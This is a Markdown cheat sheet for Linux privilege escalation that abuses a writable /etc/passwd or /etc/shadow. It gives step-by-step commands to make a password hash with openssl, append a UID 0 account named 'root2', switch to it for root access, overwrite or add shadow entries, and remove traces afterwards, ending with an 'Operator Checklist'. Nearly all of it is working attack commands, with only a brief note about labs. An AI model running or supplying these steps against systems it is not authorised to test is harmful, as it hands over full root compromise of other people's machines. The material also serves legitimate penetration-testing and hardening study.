
# /etc/passwd & /etc/shadow Abuse  

If `/etc/passwd` is writable, you can create a root-privileged user—even without access to `/etc/shadow`.  
This is one of the most dangerous permission misconfigurations.

---

## 1. Check Permissions

```bash
ls -l /etc/passwd
ls -l /etc/shadow
````

What you’re looking for:

* `/etc/passwd` → writable by you or by a group you belong to
* `/etc/shadow` → normally unreadable (doesn't matter for this method)

If `/etc/passwd` is writable → escalation is guaranteed.

---

## 2. Generate a Password Hash

Use OpenSSL to create a hash you’ll inject into `/etc/passwd`:

```bash
openssl passwd -1 password123
```

Example output:

```
$1$mYbFe0vH$1HJS7pE3W3tYh1VWNx9RV0
```

---

## 3. Inject a Root-Level User (UID 0)

Append a new account with UID 0:

```bash
echo "root2:<HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Example:

```bash
echo "root2:$1$mYbFe0vH$1HJS7pE3W3tYh1VWNx9RV0:0:0:root:/root:/bin/bash" >> /etc/passwd
```

This creates a new root-privileged user named `root2`.

---

## 4. Switch to the New User

```bash
su root2
id
```

You should now be:

```
uid=0(root) gid=0(root) groups=0(root)
```

Full root access.

---

## 5. Alternative: Replace an Existing User’s Hash

If you want to overwrite an existing account:

```bash
vim /etc/passwd
```

Replace the hash after the colon `:` in the user’s entry.

**Warning:** only do this in labs — overwriting system accounts is destructive.

---

## 6. Check If Shadow is Writable (Rare but Fatal)

```bash
ls -l /etc/shadow
```

If writable:

* you can add new hash entries
* you can replace any user password
* you can delete password fields to allow passwordless login

Example:

```bash
echo 'root:$1$hashhere:19000:0:99999:7:::' >> /etc/shadow
```

This is considered complete system compromise.

---

## 7. Cleanup (Optional)

In labs:

```bash
sed -i '/root2:/d' /etc/passwd
```

---

## 8. Operator Checklist

* [ ] Check `/etc/passwd` permissions
* [ ] Generate strong hash
* [ ] Append UID 0 user
* [ ] Validate with `su root2`
* [ ] Clean up if required


